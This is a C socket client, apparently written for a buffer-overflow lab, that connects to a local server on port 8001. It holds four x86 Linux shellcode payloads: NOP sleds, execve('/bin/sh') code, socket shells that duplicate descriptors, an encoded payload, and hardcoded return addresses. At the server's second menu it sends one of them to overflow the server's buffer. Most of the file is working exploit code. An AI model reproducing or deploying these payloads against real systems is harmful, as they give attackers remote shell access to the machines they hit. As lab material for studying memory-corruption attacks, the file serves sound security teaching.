/* A client */

#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	104
#define	ALENGTH	32

static void
loop(int s)
{
  char buffer[BLENGTH];
/*  char name[ALENGTH] = "Vansh Khanna"; */

  char name[ALENGTH] = \
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

  int ctr = 0;
char *buffer_filter = "Time";

char *exploit_1 = \
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\xbf\x80\xff\xff\xfe\x83\xf7\xff\x57\x66\x68\x1f\x90\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x96\x66\xb8\x6a\x01\x89\xf3\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x89\xf3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x60\x33\xdc\xb7\xe8\x32\xdc\xb7\x68\x33\xdc\xb7\xe8\x32\xdc\xb7";  /* Send name to server */  

char *exploit_2 = \
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\x08\x33\xdc\xb7\x08\x33\xdc\xb7";

char* exploit_3 = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x02\x02\x02\x02\xbb\x7d\x02\x02\x03\x31\xc3\x53\x66\x68\x1f\x42\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\xf8\x32\xdc\xb7";


char *exploit_4 = \
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7";

send(s, name, ALENGTH, 0); 
  int i;
  for (;;) {

    /* Receive prompt */
    if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
      /* break; */
    }

    /* Display prompt */
    fputs(buffer, stdout);

    /* Read user response */
    /* fgets(buffer, BLENGTH, stdin); */

if (strstr(buffer, buffer_filter) != NULL) {

    printf("%s\n", "First menu");
    /* Read user response */
    fgets(buffer, BLENGTH, stdin);
    /* Send user response */
    send(s,  (void *)buffer, BLENGTH, 0);
  
} else {

 if (ctr == 0) {

   printf("Second menu -> Exploit Here\n");
   /* printf("Second menu -> ExploitAddress converted to char: %s", strtoul(exploit_addr_hex, (char **)&exploit_addr_hex, 16)); */
   send(s,  (void *)exploit_4, BLENGTH, 0);
   ctr+=1;
 }
}    
  }
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  loop(s);

  /* Close the socket */
   close(s);

  return (0);
}
